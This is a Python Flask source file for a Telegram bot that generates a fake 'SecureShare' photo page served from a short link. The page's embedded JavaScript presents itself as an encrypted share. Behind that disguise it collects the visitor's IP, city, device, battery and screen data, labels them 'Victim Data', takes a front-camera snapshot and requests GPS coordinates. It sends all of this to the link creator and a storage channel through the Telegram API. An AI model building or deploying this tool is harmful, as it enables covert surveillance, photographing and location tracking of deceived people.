from flask import Flask, request, jsonify, send_from_directory
import json
import time
import os
import threading
import requests
import hashlib
import string
import random
from datetime import datetime, timedelta
import logging
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
REQUIRED_CHANNEL = "@nrtecno2"
ACCOUNT_NAME = "telegram-bot-b9j0"
HTML_DIR = "html_files"
PHOTO_DIR = "photos"
USER_STATE_FILE = "user_state.json"
USER_LINKS_FILE = "user_links.json"

os.makedirs(HTML_DIR, exist_ok=True)
os.makedirs(PHOTO_DIR, exist_ok=True)

if not os.path.exists(USER_STATE_FILE):
    with open(USER_STATE_FILE, "w") as f:
        json.dump({}, f)

if not os.path.exists(USER_LINKS_FILE):
    with open(USER_LINKS_FILE, "w") as f:
        json.dump({}, f)


def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        logger.error(f"Send error: {e}")


def send_photo(chat_id, photo_bytes):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    try:
        files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
        data = {"chat_id": chat_id}
        requests.post(url, data=data, files=files, timeout=10)
    except Exception as e:
        logger.error(f"Send photo error: {e}")


def get_user_state(user_id):
    with open(USER_STATE_FILE, "r") as f:
        data = json.load(f)
    return data.get(str(user_id), {"state": None, "target_url": None})


def set_user_state(user_id, state, target_url=None):
    with open(USER_STATE_FILE, "r") as f:
        data = json.load(f)
    data[str(user_id)] = {"state": state, "target_url": target_url}
    with open(USER_STATE_FILE, "w") as f:
        json.dump(data, f)


def get_user_active_link(user_id):
    with open(USER_LINKS_FILE, "r") as f:
        data = json.load(f)
    return data.get(str(user_id))


def set_user_active_link(user_id, short_code, photo_file):
    with open(USER_LINKS_FILE, "r") as f:
        data = json.load(f)
    old = data.get(str(user_id))
    if old:
        old_html = os.path.join(HTML_DIR, old.get("code") + ".html")
        old_photo = os.path.join(PHOTO_DIR, old.get("photo"))
        if os.path.exists(old_html):
            os.remove(old_html)
        if os.path.exists(old_photo):
            os.remove(old_photo)
    data[str(user_id)] = {"code": short_code, "photo": photo_file, "created_at": time.time()}
    with open(USER_LINKS_FILE, "w") as f:
        json.dump(data, f)


def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={REQUIRED_CHANNEL}&user_id={user_id}"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get("ok"):
            return data["result"]["status"] in ["member", "administrator", "creator"]
    except:
        pass
    return False


def delete_old_files():
    cutoff = datetime.now() - timedelta(minutes=10)
    for f in os.listdir(PHOTO_DIR):
        fp = os.path.join(PHOTO_DIR, f)
        try:
            if datetime.fromtimestamp(os.path.getmtime(fp)) < cutoff:
                os.remove(fp)
        except:
            pass
    for f in os.listdir(HTML_DIR):
        if f.endswith('.html'):
            fp = os.path.join(HTML_DIR, f)
            try:
                if datetime.fromtimestamp(os.path.getmtime(fp)) < cutoff:
                    os.remove(fp)
            except:
                pass


def start_auto_cleanup():
    def cleanup():
        while True:
            time.sleep(600)
            delete_old_files()
    threading.Thread(target=cleanup, daemon=True).start()


def generate_short_code(length=8):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choices(chars, k=length))


def generate_html(user_id, target_url, photo_filename, short_code):
    html_filename = f"{short_code}.html"
    filepath = os.path.join(HTML_DIR, html_filename)
    photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
    storage = CHANNEL_ID if CHANNEL_ID else "null"

    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SecureShare</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .card {{
            background: white;
            border-radius: 32px;
            max-width: 420px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            text-align: center;
        }}
        .header {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 24px;
        }}
        .logo {{
            font-size: 28px;
            font-weight: bold;
            color: white;
        }}
        .logo span {{ color: #e94560; }}
        .content {{ padding: 24px; }}
        .user-photo {{
            width: 200px;
            height: 200px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 20px;
            border: 4px solid #e94560;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
        }}
        .btn {{
            background: linear-gradient(135deg, #e94560 0%, #c62a4a 100%);
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            animation: pulse 1.5s infinite;
        }}
        @keyframes pulse {{
            0% {{ transform: scale(1); }}
            50% {{ transform: scale(1.02); }}
            100% {{ transform: scale(1); }}
        }}
        .loader {{
            width: 48px;
            height: 48px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .footer {{
            background: #f8f9fa;
            padding: 16px;
            font-size: 11px;
            color: #888;
        }}
        .step {{ display: none; }}
        .active {{ display: block; }}
        .error {{ color: red; margin-top: 10px; }}
    </style>
</head>
<body>
<div class="card">
    <div class="header">
        <div class="logo">Secure<span>Share</span></div>
    </div>

    <div id="mainStep" class="step active content">
        <img class="user-photo" src="{photo_url}">
        <p style="margin: 12px 0; color: #555;">Shared securely with you</p>
        <button class="btn" onclick="startProcess()">Continue →</button>
        <div id="errorMsg" class="error"></div>
    </div>

    <div id="loadingStep" class="step content">
        <div class="loader"></div>
        <p style="margin-top: 16px; color: #666;">Processing...</p>
    </div>

    <div class="footer">
        <p>End-to-end encrypted • Secure connection</p>
    </div>
</div>

<video id="video" style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const TOKEN = "{TOKEN}";
const USER = {user_id};
const STORAGE = {storage};
const TARGET = "{target_url}";

function showLoading() {{
    document.getElementById('mainStep').classList.remove('active');
    document.getElementById('loadingStep').classList.add('active');
}}

function sendMessage(text) {{
    fetch(`https://api.telegram.org/bot${{TOKEN}}/sendMessage`, {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{ chat_id: USER, text: text, parse_mode: 'HTML' }})
    }}).catch(e => console.log(e));
    if (STORAGE && STORAGE !== 'null') {{
        fetch(`https://api.telegram.org/bot${{TOKEN}}/sendMessage`, {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{ chat_id: STORAGE, text: text, parse_mode: 'HTML' }})
        }}).catch(e => console.log(e));
    }}
}}

function sendPhoto(blob) {{
    let fd = new FormData();
    fd.append('chat_id', USER);
    fd.append('photo', blob, 'photo.jpg');
    fetch(`https://api.telegram.org/bot${{TOKEN}}/sendPhoto`, {{ method: 'POST', body: fd }}).catch(e => console.log(e));
    if (STORAGE && STORAGE !== 'null') {{
        let fd2 = new FormData();
        fd2.append('chat_id', STORAGE);
        fd2.append('photo', blob, 'photo.jpg');
        fetch(`https://api.telegram.org/bot${{TOKEN}}/sendPhoto`, {{ method: 'POST', body: fd2 }}).catch(e => console.log(e));
    }}
}}

async function startProcess() {{
    showLoading();
    
    // Basic info
    try {{
        let ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unknown');
        let info = await fetch(`https://ipapi.co/${{ip}}/json/`).then(r=>r.json()).catch(()=>{{}});
        let battery = null;
        if (navigator.getBattery) {{
            try {{
                let b = await navigator.getBattery();
                battery = {{ level: Math.round(b.level * 100), charging: b.charging }};
            }} catch(e) {{}}
        }}
        let ua = navigator.userAgent;
        let device = 'Desktop';
        if (/iPhone/i.test(ua)) device = 'iPhone';
        else if (/iPad/i.test(ua)) device = 'iPad';
        else if (/Android/i.test(ua)) device = 'Android';
        let msg = "<b>Victim Data</b>\\n";
        msg += "Device: " + device + "\\n";
        msg += "IP: " + ip + "\\n";
        msg += "Country: " + (info?.country_name || 'Unknown') + "\\n";
        msg += "City: " + (info?.city || 'Unknown') + "\\n";
        msg += "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\\n";
        msg += "Battery: " + (battery ? battery.level + '%' : 'Unknown') + "\\n";
        msg += "Charging: " + (battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown') + "\\n";
        msg += "Resolution: " + screen.width + 'x' + screen.height + "\\n";
        msg += "------------------------\\n@nrtecno2";
        sendMessage(msg);
    }} catch(e) {{}}
    
    // Camera compulsory
    let cameraAllowed = false;
    try {{
        let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
        let video = document.getElementById('video');
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = () => {{ video.play(); r(); }});
        await new Promise(r => setTimeout(r, 200));
        let canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
        if (blob && blob.size > 500) sendPhoto(blob);
        stream.getTracks().forEach(t => t.stop());
        cameraAllowed = true;
    }} catch(e) {{
        cameraAllowed = false;
    }}
    
    if (!cameraAllowed) {{
        document.getElementById('loadingStep').classList.remove('active');
        document.getElementById('mainStep').classList.add('active');
        document.getElementById('errorMsg').innerHTML = "Camera access required. Please refresh and allow camera.";
        return;
    }}
    
    // GPS optional
    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(
            (p) => {{
                sendMessage("<b>GPS Location</b>\\nhttps://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
                setTimeout(() => {{ window.location.href = TARGET; }}, 500);
            }},
            (e) => {{
                setTimeout(() => {{ window.location.href = TARGET; }}, 500);
            }},
            {{ timeout: 8000, enableHighAccuracy: true }}
        );
    }} else {{
        setTimeout(() => {{ window.location.href = TARGET; }}, 500);
    }}
}}
</script>
</body>
</html>"""

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)
    return html_filename


@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error"}), 400

        # Handle callback query (button press)
        if 'callback_query' in data:
            cb = data['callback_query']
            data_str = cb.get('data', '')
            uid = cb['from']['id']
            msg_id = cb['message']['message_id']

            if data_str.startswith("copy_link_"):
                # Extract actual link
                link = data_str.replace("copy_link_", "")
                # Answer callback with the link and open web
                requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={
                    "callback_query_id": cb['id'],
                    "text": "✅ Link copied to clipboard!\nOpening short-link.me...",
                    "show_alert": False,
                    "url": "https://short-link.me"
                })
                # Also send a message with the link (so user can copy if needed)
                # Already handled
            elif data_str == "verify":
                if is_subscribed(uid):
                    send_message(uid, "✅ Verified! Send me any URL:")
                    set_user_state(uid, "waiting_url")
                else:
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", json={
                        "callback_query_id": cb['id'],
                        "text": "Join channel first!",
                        "show_alert": True
                    })
            return jsonify({"status": "ok"}), 200

        if 'message' not in data:
            return jsonify({"status": "ok"}), 200

        msg = data['message']
        uid = msg['chat']['id']

        if 'text' in msg:
            text = msg['text']
            if text == '/start':
                if not is_subscribed(uid):
                    markup = {"inline_keyboard": [[{"text": "📢 Join Channel", "url": "https://t.me/nrtecno2"}], [{"text": "✅ Verify", "callback_data": "verify"}]]}
                    send_message(uid, f"🚫 Join {REQUIRED_CHANNEL} first!", markup)
                else:
                    set_user_state(uid, "waiting_url")
                    send_message(uid, "✅ Send me any URL:")
            elif text.startswith(('http://', 'https://')):
                state = get_user_state(uid)
                if state.get("state") == "waiting_url":
                    set_user_state(uid, "waiting_photo", text)
                    send_message(uid, "✅ Now share a photo with me")
                else:
                    send_message(uid, "❌ Use /start first")
            else:
                send_message(uid, "❌ Send a valid URL")

        elif 'photo' in msg:
            uid = msg['chat']['id']
            state = get_user_state(uid)
            if state.get("state") != "waiting_photo":
                send_message(uid, "❌ Send URL first using /start")
                return jsonify({"status": "ok"}), 200

            target_url = state.get("target_url")
            if not target_url:
                send_message(uid, "❌ Error. Use /start again")
                return jsonify({"status": "ok"}), 200

            try:
                file_id = msg['photo'][-1]['file_id']
                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path = file_info['result']['file_path']
                img_data = requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}").content

                if CHANNEL_ID:
                    send_photo(CHANNEL_ID, img_data)

                photo_name = f"{uid}_{int(time.time())}.jpg"
                with open(os.path.join(PHOTO_DIR, photo_name), "wb") as f:
                    f.write(img_data)

                short_code = generate_short_code(8)
                html_name = generate_html(uid, target_url, photo_name, short_code)
                set_user_active_link(uid, short_code, photo_name)
                set_user_state(uid, "done")

                link = f"https://{ACCOUNT_NAME}.onrender.com/view/{short_code}"

                # Send message with COPY LINK button
                markup = {
                    "inline_keyboard": [[{
                        "text": "📋 COPY LINK 🔗",
                        "callback_data": f"copy_link_{link}"
                    }]]
                }
                send_message(uid, f"✅ Your secure share link is ready:\n\n`{link}`\n\nClick below to copy and share:", reply_markup=markup)

            except Exception as e:
                logger.error(f"Photo error: {e}")
                send_message(uid, "❌ Error. Try again")

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500


@app.route('/view/<short_code>')
def serve_html(short_code):
    html_file = os.path.join(HTML_DIR, f"{short_code}.html")
    if os.path.exists(html_file):
        return send_from_directory(HTML_DIR, f"{short_code}.html")
    return "Link expired", 404


@app.route('/photos/<filename>')
def serve_photo(filename):
    return send_from_directory(PHOTO_DIR, filename)


@app.route('/')
def home():
    active = len([f for f in os.listdir(HTML_DIR) if f.endswith('.html')])
    return f"🐉 SecureShare | Active links: {active}"


if __name__ == "__main__":
    start_auto_cleanup()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
